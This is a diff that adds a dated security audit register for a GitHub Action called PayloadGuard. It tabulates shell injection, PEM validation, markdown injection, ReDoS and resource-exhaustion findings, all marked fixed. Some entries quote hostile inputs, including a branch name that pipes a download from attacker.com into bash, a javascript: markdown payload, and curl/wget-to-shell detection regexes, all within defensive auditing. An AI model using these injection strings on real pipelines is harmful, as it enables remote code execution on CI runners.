@@ -222,6 +222,55 @@ All HIGH severity findings: **resolved**. All MEDIUM security findings: **resolv
 
 ---
 
+## Findings Register — Audit Run: 2026-05-04 (Security Hardening / Marketplace Readiness)
+
+Conducted by: Claude (claude-sonnet-4-6)  
+Trigger: Pre-marketplace security review — expression injection, credential handling, input validation, ReDoS, resource exhaustion  
+Fixes applied: 2026-05-04 (commit `bd90052`)  
+Branch: `claude/check-mcp-connection-OUqlz`
+
+### Scope
+
+This audit covered the full action surface as seen by a consumer repo running PayloadGuard: `action.yml`, `analyze.py`, `post_check_run.py`, `structural_parser.py`. The audit assumed adversarial branch names, adversarial repo content (large blobs, deep ASTs, crafted YAML configs, hostile filenames), and a compromised or misconfigured App credential set. Static code review only — no dynamic testing.
+
+### Security Findings
+
+| ID | Finding | Severity | Status | Commit |
+|---|---|---|---|---|
+| §SEC.1 | Shell injection — `${{ github.head_ref }}` and `${{ github.base_ref }}` interpolated directly into `run:` shell scripts in `action.yml`. A branch named `$(curl attacker.com \| bash)` executes arbitrary code in the runner. | **CRITICAL** | **Fixed** | `bd90052` — moved to `env:` vars (`$HEAD_REF`, `$BASE_REF`) |
+| §SEC.2 | JWT PEM validation too permissive — `"-----BEGIN" not in key` accepts any string containing the substring, including truncated or garbage keys that silently fail later in JWT signing | **CRITICAL** | **Fixed** | `bd90052` — replaced with strict `re.compile(r"-----BEGIN [A-Z ]+-----\r?\n[A-Za-z0-9+/=\r\n]+-----END [A-Z ]+-----")` |
+| §SEC.3 | Markdown injection — `deleted_components` items written directly to GitHub PR comment body without escaping. A deleted function named `` `](javascript:alert(1)) `` injects raw markdown. Branch/target names in report header also unescaped. | **CRITICAL** | **Fixed** | `bd90052` — `_md_escape()` applied to all component names and branch/target in markdown output |
+| §SEC.4 | URL injection — `repo` (from `GITHUB_REPOSITORY`) and `installation_id` inserted into GitHub API URL paths without format validation. `../` traversal or unusual characters malform the URL or target a different resource. | HIGH | **Fixed** | `bd90052` — `re.fullmatch(r"[A-Za-z0-9_.\-]+/[A-Za-z0-9_.\-]+", repo)` and `re.fullmatch(r"\d+", installation_id)` guards added |
+| §SEC.5 | Blob reads unbounded — `d.a_blob.data_stream.read()` / `d.b_blob.data_stream.read()` called with no size argument in both the structural drift loop (L4) and the added-file content scan (L1 extension). A PR adding or modifying a 500 MB file OOMs the runner. | HIGH | **Fixed** | `bd90052` — `_MAX_BLOB_BYTES = 1_048_576` constant; all three blob reads now use `read(_MAX_BLOB_BYTES)` |
+| §SEC.6 | Private key not masked — `inputs.private-key` passed as an Action input with no `::add-mask::` call. Key material may appear in runner debug logs or exception tracebacks from `post_check_run.py`. | HIGH | **Fixed** | `bd90052` — new "Mask secrets" step added as the first `run:` step in `action.yml`; runs before any Python invocation |
+| §SEC.7 | `repo_path` not normalised — taken directly from CLI argument and passed to `git.Repo()`. Symlink traversal or `..` components may resolve outside the intended directory on some systems. | HIGH | **Fixed** | `bd90052` — `os.path.realpath(os.path.abspath(repo_path))` applied at CLI entry point before any use |
+| §SEC.8 | ReDoS in content-scan shell patterns — `curl\b[^\n]*\|\s*(ba)?sh` and `wget\b[^\n]*\|\s*(ba)?sh` use unbounded `[^\n]*` before `\|`. A line containing many `\|` characters can trigger catastrophic polynomial backtracking. | MEDIUM | **Fixed** | `bd90052` — rewritten as `curl\b.{0,200}\|\s*(?:ba)?sh` to bound the middle segment |
+| §SEC.9 | `ast.parse()` has no guard against deeply nested code — Python's recursion limit causes `RecursionError` on adversarially nested source (thousands of nested calls). Process crash, no analysis result. | MEDIUM | **Fixed** | `bd90052` — `except (RecursionError, MemoryError): return set()` added in `structural_parser.py` |
+| §SEC.10 | YAML config has no type validation — `load_config()` performs deep-merge but does not check that merged threshold values are the correct types (list-of-3, numeric). A malformed `payloadguard.yml` with a string where a list is expected crashes inside `_assess_consequence()` with an opaque `TypeError`. | MEDIUM | **Fixed** | `bd90052` — `isinstance` checks for all threshold keys after merge; invalid values log a WARNING and fall back to defaults |
+| §SEC.11 | Exception messages in `post_check_run.py` may surface key material — the `__main__` handler does `print(f"... {e}")` with no sanitisation. JWT library exceptions can include PEM key fragments in the message text. | MEDIUM | **Fixed** | `bd90052` — messages containing `BEGIN`, `PRIVATE`, `KEY`, or `-----` are replaced with `[redacted — possible key material]` before printing |
+
+### Marketplace Checklist Findings
+
+| ID | Item | Status | Commit |
+|---|---|---|---|
+| §MC.1 | `SECURITY.md` absent — required for GitHub Marketplace listing; must document supported versions and vulnerability reporting path | **Fixed** | `bd90052` — `SECURITY.md` created with versions, reporting URL, scope, and SLA |
+| §MC.2 | `action.yml` `branding:` block — verified present (`icon: shield`, `color: red`) | N/A — already compliant | — |
+| §MC.3 | `action.yml` inputs — all have `description:` fields; all optional inputs have `default: ""` | N/A — already compliant | — |
+
+### Summary — 2026-05-04 Run
+
+| Category | Total findings | Fixed | Open |
+|---|---|---|---|
+| CRITICAL security | 3 | 3 | 0 |
+| HIGH security | 4 | 4 | 0 |
+| MEDIUM security | 4 | 4 | 0 |
+| Marketplace compliance | 3 | 1 (SECURITY.md) | 0 (2 already compliant) |
+| **Total** | **14** | **14** | **0** |
+
+All CRITICAL and HIGH findings resolved. No new open items. Test suite maintained at 166 pass / 7 skip throughout.
+
+---
+
 ## Residual Open Items
 
 These items remain open. They are documented here so the next audit run can assess whether the risk has changed or the scope has expanded enough to warrant prioritising them.
